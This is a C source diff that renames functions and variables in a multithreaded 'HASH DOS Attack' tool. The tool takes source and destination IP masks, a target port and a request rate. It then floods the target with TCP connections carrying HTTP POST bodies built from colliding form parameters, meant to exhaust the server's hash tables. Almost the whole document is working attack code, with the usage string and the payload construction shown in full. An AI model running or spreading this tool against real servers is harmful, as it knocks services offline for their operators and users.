@@ -22,26 +22,26 @@ pthread_cond_t g_hash_dos_cond;
 struct timespec g_hash_dos_before_time;
 struct timespec g_hash_dos_now_time;
 
-char hash_dos_content[1001];
-char hash_dos_method[1300];
+char g_hash_dos_content[1001];
+char g_hash_dos_method[1300];
 
-void hash_dos_print_usage(void)
+void HashDosPrintUsage(void)
 {
-	printf("HASH DOS Attack Usage : "
+	printf("kHashDos DOS Attack Usage : "
 				 "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 	return;
 }
 
-void *generate_hash_dos(void *data)
+void *GenerateHashDos(void *data)
 {
 	int thread_id = *((int *)data);
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_hash_dos_mutex);
 		// get current resource
-		get_masking_arguments(&g_hash_dos_input, &g_hash_dos_now);
+		GetMaskingArguments(&g_hash_dos_input, &g_hash_dos_now);
 		// time check
-		time_check(
+		TimeCheck(
 				&g_hash_dos_cond,
 				&g_hash_dos_before_time,
 				&g_hash_dos_now_time,
@@ -54,7 +54,7 @@ void *generate_hash_dos(void *data)
 		int src_port,seq,ack;
 		int sock;
 
-		sock =  tcp_make_connection(
+		sock =  MakeTcpConnection(
 				inet_addr(g_hash_dos_now.src),
 				inet_addr(g_hash_dos_now.dest),
 				&src_port,
@@ -76,19 +76,19 @@ void *generate_hash_dos(void *data)
 			exit(1);
 		}*/
 
-		tcp_socket_send_data(
+		TcpSocketSendData(
 				sock,
 				inet_addr(g_hash_dos_now.src),
 				inet_addr(g_hash_dos_now.dest),
 				src_port,
 				g_hash_dos_now.port,
-				hash_dos_method,
-				strlen(hash_dos_method),
+				g_hash_dos_method,
+				strlen(g_hash_dos_method),
 				seq,
 				ack,
 				0);
 /*
-		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
+		if (send(sock, g_hash_dos_method, strlen(g_hash_dos_method), 0) < 0) {
 			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
 			exit(1);
 		}*/
@@ -100,11 +100,11 @@ void *generate_hash_dos(void *data)
 	return NULL;
 }
 
-void *hash_dos_time_check(void *data)
+void *HashDosTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_hash_dos_mutex);
-		time_check(
+		TimeCheck(
 				&g_hash_dos_cond,
 				&g_hash_dos_before_time,
 				&g_hash_dos_now_time,
@@ -114,7 +114,7 @@ void *hash_dos_time_check(void *data)
 	return NULL;
 }
 
-void hash_dos_main(char *argv[])
+void HashDosMain(char *argv[])
 {
 	// argument check
 
@@ -124,10 +124,10 @@ void hash_dos_main(char *argv[])
 		argc++;
 	}
 	if (argc != 4) {
-		hash_dos_print_usage();
+		HashDosPrintUsage();
 		return;
 	}
-	argv_to_input_arguments(argv, &g_hash_dos_input);
+	ArgvToInputArguments(argv, &g_hash_dos_input);
 	g_hash_dos_num_generated_in_sec = 0;
 	g_hash_dos_num_total = 0;
 	// prepare arbitary post method args
@@ -143,13 +143,13 @@ void hash_dos_main(char *argv[])
 
 		for(j=0;j<21;j++)
 		{
-			hash_dos_content[index+j] = arg[j];
+			g_hash_dos_content[index+j] = arg[j];
 		}
 		index+=20;
 	}
-	hash_dos_content[index] = '\0';
+	g_hash_dos_content[index] = '\0';
 
-	sprintf(hash_dos_method,
+	sprintf(g_hash_dos_method,
 		"POST / HTTP/1.1\r\nHost: %s\r\n"
 		"User-Agent: python-requests/2.22.0\r\n"
 		"Accept-Encoding: gzip, deflate\r\n"
@@ -158,8 +158,8 @@ void hash_dos_main(char *argv[])
 		"Content-Type: application/x-www-form-urlencoded\r\n"
 		"Content-Length: %d\r\n\r\n",
 		g_hash_dos_input.src,
-		(int) sizeof(hash_dos_content));
-	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n", hash_dos_content);
+		(int) sizeof(g_hash_dos_content));
+	sprintf(g_hash_dos_method + strlen(g_hash_dos_method), "%s\r\n", g_hash_dos_content);
 	memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
 	memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));
 
@@ -175,10 +175,10 @@ void hash_dos_main(char *argv[])
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_hash_dos,
+				GenerateHashDos,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, hash_dos_time_check, NULL);
+	pthread_create(&threads[i], NULL, HashDosTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		printf("called\n");
 		pthread_join(threads[i], NULL);
